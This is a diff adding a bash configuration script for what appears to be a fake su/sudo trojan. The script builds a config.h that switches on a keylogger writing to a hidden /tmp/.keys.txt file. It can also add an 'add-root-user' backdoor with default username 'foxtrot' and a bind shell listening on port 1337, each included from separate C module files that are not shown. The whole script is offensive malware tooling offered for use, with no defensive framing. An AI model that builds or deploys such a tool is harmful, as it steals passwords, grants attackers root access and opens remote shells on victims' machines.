@@ -1,0 +1,86 @@
+#!/bin/bash
+
+fun=(add-root-user bind-shell)
+programs=(su sudo)
+
+echo -e "\n[+] configuring fake$1 ..."
+
+if [[ -e config.h ]];then
+	read -p "config.h already exist, do you want to overwrite it? [y/N] " r
+	[[ "${r,}" != "y" ]] && exit;
+fi
+
+add_root_user()
+{
+	config+=("#define PWNFUNCTION add_root_user();")
+	read -p "username (default: foxtrot): " username
+
+	if [[ ! -z "$username" ]];then
+		config+=("#define USER \"${username}:\"")
+	fi
+
+	config+=('#include "fun/add-root-user.c"')
+}
+
+bind_shell()
+{
+	config+=("#define PWNFUNCTION bind_shell();")
+	read -p "listen port (Default: 1337): " port
+
+	if [[ ! -z "$port" ]];then
+		config+=("#define PORT $port")
+	fi
+	echo "--> $port"
+
+	config+=('#include "fun/bind-shell.c"')
+}
+
+keylogger()
+{
+	read -p "Number of lines to record [empty = store all]: " line_limit
+	read -p "logfile (default: /tmp/.keys.txt): " logfile
+
+	config+=("#define KEYLOGGER")
+	if [[ ! -z "$line_limit" ]];then
+		config+=("#define LINE_LIMIT ${line_limit}")
+	fi
+
+	if [[ -z "$logfile" ]];then
+		logfile="/tmp/.keys.txt"
+	fi
+
+	config+=("#define LOGFILE \"${logfile}\"")
+	config+=('#include "fun/keylogger.c"')
+}
+
+read -p "Activate keylogger? [y/N] " r
+[[ "${r,}" == "y" ]] && keylogger
+
+read -p "Use some FUN modules? [y/N] " r
+if [[ "${r,}" == "y" ]];then
+	while :;do
+		for ((i = 1; i <= ${#fun[@]}; i++));do
+			echo "[$i] ${fun[i - 1]}"
+		done
+
+		echo "[$i] exit"
+		read -p "> " r
+
+		(( r == i )) && exit;
+		(( r < i && r > 0 )) && break;
+	done
+
+	config+=("#define CMDCHANGE")
+	${fun[r - 1]//-/_}
+
+fi
+
+echo -e "#ifndef __CONFIG_H__\n#define __CONFIG_H__\n" > config.h
+
+for i in "${config[@]}"
+do
+	echo -e "$i" >> config.h
+done
+
+echo -e "\n#endif" >> config.h
+echo -e "[+] config file created at ${PWD}/config.h\n\n"
